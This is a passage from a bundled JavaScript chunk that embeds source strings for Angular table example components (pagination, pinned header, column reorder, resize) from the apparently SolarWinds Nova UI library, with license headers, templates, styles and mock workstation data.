strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    PaginatorComponent,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-pagination-example",\n    providers: [ClientSideDataSource],\n    templateUrl: "./table-pagination.example.component.html",\n})\nexport class TablePaginationExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource?: IExampleTableModel[] = [];\n    public paginationTotal?: number;\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>\n    ) {\n        dataSourceService.setData(getData());\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                    this.paginationTotal = data.paginator?.total;\n                }\n            );\n\n        this.dataSourceService.applyFilters();\n    }\n\n    public changePagination(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 36,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 75,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 47,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 55,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 32,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 6,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 23,\n            checks: [\n                {\n                    icon: "status_mixed",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 7,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 7,\n            checks: [\n                {\n                    icon: "status_external",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 8,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 86,\n            checks: [\n                {\n                    icon: "status_inactive",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 9,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 9,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 10,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 11,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 68,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 12,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 52,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 13,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 38,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 14,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 15,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 70,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 16,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 9,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 17,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 2,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 18,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 24,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 19,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 20,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 48,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},39503:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" style="height: 300px">\n    <table nui-table [dataSource]="dataSource">\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="icon-margin"\n                    ></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n        <tr\n            nui-header-row\n            *nuiHeaderRowDef="displayedColumns; sticky: true"\n        ></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},94971:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".icon-margin {\n    margin-right: 5px;\n}\n"},11255:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-pinned-header-example",\n    templateUrl: "./table-pinned-header.example.component.html",\n    styleUrls: ["./table-pinned-header.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TablePinnedHeaderComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 52,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 3,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 68,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 86,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 70,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 6,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 71,\n            checks: [\n                {\n                    icon: "status_mixed",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 7,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 6,\n            checks: [\n                {\n                    icon: "status_external",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 8,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_inactive",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 9,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 16,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 10,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 96,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},83943:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-table-cell-reorder">\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [reorderable]="true"\n        (columnsOrderChange)="toastColumns($event)"\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="icon-margin"\n                    ></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center justify-content-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},49427:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".icon-margin {\n    margin-right: 5px;\n}\n"},68799:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-reorder-example",\n    templateUrl: "./table-reorder.example.component.html",\n    styleUrls: ["./table-reorder.example.component.less"],\n})\nexport class TableReorderExampleComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public toastColumns(event: string[]): void {\n        this.toastService.info({\n            message:\n                "Current order of columns is: " +\n                event.toString().replace(/,/g, ", "),\n        });\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 55,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 6,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 7,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 27,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 18,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},51983:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-resizable-table">\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [resizable]="true"\n        [sortable]="true"\n    >\n        <ng-container nuiColumnDef="position" [columnWidth]="50">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name" [columnWidth]="400">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="mr-1"\n                    ></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th id="nui-header-cell-icon" nui-header-cell *nuiHeaderCellDef>\n                <div class="d-flex align-items-center">\n                    <nui-icon icon="enable"></nui-icon>\n                </div>\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th\n                nui-header-cell\n                [isColumnSortingDisabled]="true"\n                *nuiHeaderCellDef\n                i18n\n            >\n                Checks\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},9431:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-resize-example",\n    templateUrl: "./table-resize.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableResizeExampleComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_inactive",\n            outages: 85,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n        